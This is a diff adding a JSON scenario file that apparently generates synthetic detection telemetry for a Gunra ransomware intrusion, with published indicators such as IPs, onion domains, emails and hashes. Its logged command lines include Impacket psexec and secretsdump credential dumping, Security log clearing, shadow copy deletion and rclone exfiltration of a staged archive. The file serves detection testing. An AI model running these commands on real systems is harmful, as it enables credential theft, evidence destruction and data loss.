@@ -1,0 +1,1012 @@
+{
+  "schema_version": 1,
+  "id": "cisa-aa26-222a-gunra-composite-v1",
+  "output_name": "gunra-v1",
+  "title": "Gunra: post-access SMB compromise, collection, recovery-inhibition attempts and source indicator coverage",
+  "description": "AA26-222A initial August 10 2026 publication and user-supplied STIX. Core post-access story assumes an existing privileged foothold; historical coverage blocks are independent fixtures, not one documented victim. All run settings, host/port assignments, paths, timing and outcomes are synthetic unless explicitly stated in the source notes.",
+  "steps": [
+    {
+      "id": "post-access-discovery",
+      "offset_seconds": 60,
+      "description": "Fictional prerequisite: prod-rdp-01 and existing LAB\\admin credentials are already compromised. The source describes network discovery; this branch does not invent Fortinet/VDI assets or an exploit. Command arguments and time are synthetic.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\netstat.exe",
+            "process_id": 7100,
+            "process_cmdline": "netstat.exe -ano"
+          }
+        }
+      ]
+    },
+    {
+      "id": "impacket-lateral-movement",
+      "offset_seconds": 600,
+      "description": "Source Impacket psexec.py/SMB behavior. Installed Python/tool paths, targets, session ordering and parent process are fictional. Existing privileged account is assumed; no low-privilege escalation is inferred.",
+      "depends_on": [
+        "post-access-discovery"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Python315\\python.exe",
+            "process_id": 7101,
+            "process_cmdline": "python.exe C:\\ProgramData\\Tools\\psexec.py LAB/admin@prod-file-01 whoami"
+          }
+        },
+        {
+          "source": "eastwest-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest_port": 445,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "success",
+            "app": "smb"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\cmd.exe",
+            "process_id": 8100,
+            "process_cmdline": "cmd.exe /c whoami"
+          }
+        }
+      ]
+    },
+    {
+      "id": "credential-access-attempt",
+      "offset_seconds": 1200,
+      "description": "Source secretsdump.py against a domain controller. These are a command launch and SMB observations, not proof of NTDS extraction, stolen hashes or pass-the-hash/ticket success.",
+      "depends_on": [
+        "impacket-lateral-movement"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Python315\\python.exe",
+            "process_id": 7102,
+            "process_cmdline": "python.exe C:\\ProgramData\\Tools\\secretsdump.py -just-dc LAB/admin@dc-01"
+          }
+        },
+        {
+          "source": "eastwest-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:dc-01:ip"
+            },
+            "dest_port": 445,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-rdp-01:ip"
+            },
+            "dest": {
+              "ref": "asset:dc-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "success",
+            "app": "smb"
+          }
+        }
+      ]
+    },
+    {
+      "id": "log-clearing-attempt",
+      "offset_seconds": 1800,
+      "description": "Source log-clearing behavior. Fictional wevtutil command launch does not prove logs were erased or sensors stopped.",
+      "depends_on": [
+        "credential-access-attempt"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\wevtutil.exe",
+            "process_id": 8101,
+            "process_cmdline": "wevtutil.exe cl Security"
+          }
+        }
+      ]
+    },
+    {
+      "id": "file-discovery",
+      "offset_seconds": 2100,
+      "description": "Source file/directory discovery represented by a fictional directory-listing command; no claim of exact native API call visibility.",
+      "depends_on": [
+        "log-clearing-attempt"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\cmd.exe",
+            "process_id": 8102,
+            "process_cmdline": "cmd.exe /c dir D:\\Shares\\Projects /s"
+          }
+        }
+      ]
+    },
+    {
+      "id": "collection-and-archive",
+      "offset_seconds": 2700,
+      "description": "Source local collection and 7-Zip/archive behavior. Exact file, archive path and arguments are fictional; collection is not proof of transferred file bytes.",
+      "depends_on": [
+        "file-discovery"
+      ],
+      "observations": [
+        {
+          "source": "windows-file.jsonl",
+          "dataset": "Data_Access.Data_Access",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "object": "infrastructure-plan.csv",
+            "object_path": "D:\\Shares\\Projects\\infrastructure-plan.csv",
+            "action": "read",
+            "access_result": "success"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Tools\\7z.exe",
+            "process_id": 8103,
+            "process_cmdline": "7z.exe a C:\\ProgramData\\Stage\\project.7z D:\\Shares\\Projects\\infrastructure-plan.csv"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Stage\\project.7z",
+            "action": "created"
+          }
+        }
+      ]
+    },
+    {
+      "id": "transfer-observations",
+      "offset_seconds": 3300,
+      "description": "Source Rclone/transfer behavior, fictional config and TEST-NET destination. No claim this endpoint is Mega, OneDrive, SharePoint or a published IP. Byte count and duration invented.",
+      "depends_on": [
+        "collection-and-archive"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Tools\\rclone.exe",
+            "process_id": 8104,
+            "process_cmdline": "rclone.exe copy C:\\ProgramData\\Stage\\project.7z remote:archive"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": {
+              "ref": "entity:entity-external-upload-01:ip"
+            },
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed",
+            "bytes_out": 73400320,
+            "bytes_in": 4096,
+            "bytes": 73404416,
+            "duration": 180
+          }
+        }
+      ]
+    },
+    {
+      "id": "shadowcopy-deletion-attempt",
+      "offset_seconds": 3900,
+      "description": "Source WMI command form, with a fictional GUID. Process launch alone does not prove shadowcopy deletion or effective recovery impairment.",
+      "depends_on": [
+        "transfer-observations"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\Windows\\System32\\cmd.exe",
+            "process_id": 8105,
+            "process_cmdline": "cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='{00000000-0000-4000-8000-000000000001}'\" delete"
+          }
+        }
+      ]
+    },
+    {
+      "id": "impact-artifacts",
+      "offset_seconds": 4500,
+      "description": "Source .ENCRT extension and R3ADM3.txt note. Fictional process filename/placement, file observation and rename; no malware bytes or cryptographic outcome. Do not infer a C2 connection from a self-contained encryptor.",
+      "depends_on": [
+        "shadowcopy-deletion-attempt"
+      ],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Processes",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "process": "C:\\ProgramData\\Stage\\gunra-lab.exe",
+            "process_id": 8106,
+            "process_cmdline": "C:\\ProgramData\\Stage\\gunra-lab.exe"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "D:\\Shares\\Projects\\infrastructure-plan.csv.ENCRT",
+            "action": "renamed"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "D:\\Shares\\Projects\\R3ADM3.txt",
+            "action": "created"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-ip-coverage",
+      "offset_seconds": 5100,
+      "description": "Independent historical matching fixtures for all seventeen STIX IPs. Direction, port and placement are fictional; Table 2 first/last-seen dates are not overwritten. These are not claims of current infrastructure or one victim contacting every host.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "182.204.39.118",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "23.239.119.2",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "67.43.53.10",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "103.125.234.14",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "182.204.21.240",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "86.54.28.216",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "182.204.16.112",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "123.244.187.144",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "23.239.119.3",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "123.246.37.108",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "91.201.66.146",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "70.36.99.82",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "211.21.210.181",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "23.239.119.6",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "23.239.119.5",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "123.184.143.105",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        },
+        {
+          "source": "egress-firewall.jsonl",
+          "dataset": "Network_Traffic.All_Traffic",
+          "fields": {
+            "src": {
+              "ref": "asset:prod-file-01:ip"
+            },
+            "dest": "23.239.119.4",
+            "dest_port": 443,
+            "transport": "tcp",
+            "action": "allowed"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-domain-artifacts",
+      "offset_seconds": 5160,
+      "description": "Independent recovered-artifact fixtures for all four STIX domain names, including Tor addresses. Generic collector extraction, file path and placement fictional. No public DNS resolution, Tor connection, C2 or encryptor networking is asserted.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\web-contact.txt",
+            "action": "created",
+            "file_domain": "datapub.news"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\web-contact.txt",
+            "action": "created",
+            "file_domain": "nsnhzysbntsqdwpys6mhml33muccsvterxewh5rkbmcab7bg2ttevjqd.onion"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\web-contact.txt",
+            "action": "created",
+            "file_domain": "lgiil72vkmdtbc3qv4tyq6wedyjxqr2qd4ze7xl2cxgerdnymxj7soqd.onion"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\web-contact.txt",
+            "action": "created",
+            "file_domain": "gunrabxbig445sjqa535uaymzerj6fp4nwc6ngc2xughf2pedjdhk4ad.onion"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-email-artifacts",
+      "offset_seconds": 5220,
+      "description": "Independent recovered-contact artifact fixtures for all four STIX email addresses. Generic extracted metadata, not invented email delivery, successful negotiation or native Sysmon content capture.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contact.txt",
+            "action": "created",
+            "file_email": "a00f105546345756@proton.me"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contact.txt",
+            "action": "created",
+            "file_email": "6449a3c1e612168526@proton.me"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contact.txt",
+            "action": "created",
+            "file_email": "4569f6322bc3b22e9@proton.me"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contact.txt",
+            "action": "created",
+            "file_email": "ilovemycubscout@gmail.com"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-file-samples",
+      "offset_seconds": 5280,
+      "description": "Independent file-metadata fixtures: all supplied hashes with their exact associated filenames. Each hash and filename is on the same observation. All msmp OR alternatives are represented; metadata does not assert execution or exfiltration/encryption efficacy.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\msmp.exe",
+            "action": "created",
+            "file_hash": "BB79502D301BA77745B7DBC5DF4269FC7B074CDA"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\msmp.exe",
+            "action": "created",
+            "file_hash": "A82E496B7B5279CB6B93393EC167DD3F50AFF1557366784B25F9E51CB23689D9"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\msmp.exe",
+            "action": "created",
+            "file_hash": "7DD26568049FAC1B87F676ECFAAC9BA0"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\cryptor.exe",
+            "action": "created",
+            "file_hash": "91F8FC7A3290611E28A35A403FD815554D9D856006CC2EE91CCDB64057AE53B0"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\main.exe",
+            "action": "created",
+            "file_hash": "834EFE9B392C6C000877EA5613A079445AFFC16FE8AF5997D68C55CAFC95E5D1"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\main.exe",
+            "action": "created",
+            "file_hash": "2DC70A12D158D437E45A55B1D52F3D61C6082A1E1667573302BA3B62813E2751"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-contact-and-account-artifacts",
+      "offset_seconds": 5340,
+      "description": "Independent generic collector extracts for the four publication qTox strings and Fortinet account name from hypothetical acquired artifacts. No qTox traffic, appliance provisioning, creation of a real account, or cryptographic validity is implied; preserve the source nonhex S.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contacts.txt",
+            "action": "created",
+            "file_contact_id": "2507312EC10BB44ED9DAA04E3C5C27E8C13154649B1A02E73ACFAE1681EE0208D05133A8FB22"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contacts.txt",
+            "action": "created",
+            "file_contact_id": "0FE87CED0C611AE97E049C64288557F49E8271E91399E849328B078DA789A573031783235BEF"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contacts.txt",
+            "action": "created",
+            "file_contact_id": "47829AF1C943D4C296C910706923AS199BDA4995B076ED9A9016F7DEF161D445DF00F13E6900"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\contacts.txt",
+            "action": "created",
+            "file_contact_id": "9500B1A73716BCF40745086F7184A33EA0141B7D3F852431C8FDD2E1E8FAF9277E9FDC117B47"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Evidence\\fortinet-users.txt",
+            "action": "created",
+            "file_account": "forticloud-sync"
+          }
+        }
+      ]
+    },
+    {
+      "id": "historical-impact-file-artifacts",
+      "offset_seconds": 5400,
+      "description": "Independent metadata fixtures for both inconsistent note-name spellings in the PDF, Windows .ENCRT/.CRYPT and Linux .GNRA. Linux observation is generic filesystem metadata on an existing Linux host, not Sysmon or an additional victim compromise. No crypto or decryption is simulated.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\R3ADM3.txt",
+            "action": "created"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\R34DM3.txt",
+            "action": "created"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\example.ENCRT",
+            "action": "created"
+          }
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\Lab\\Samples\\example.CRYPT",
+            "action": "created"
+          }
+        },
+        {
+          "source": "endpoint-lab.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-app-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "/srv/samples/example.GNRA",
+            "action": "created"
+          }
+        }
+      ]
+    }
+  ]
+}
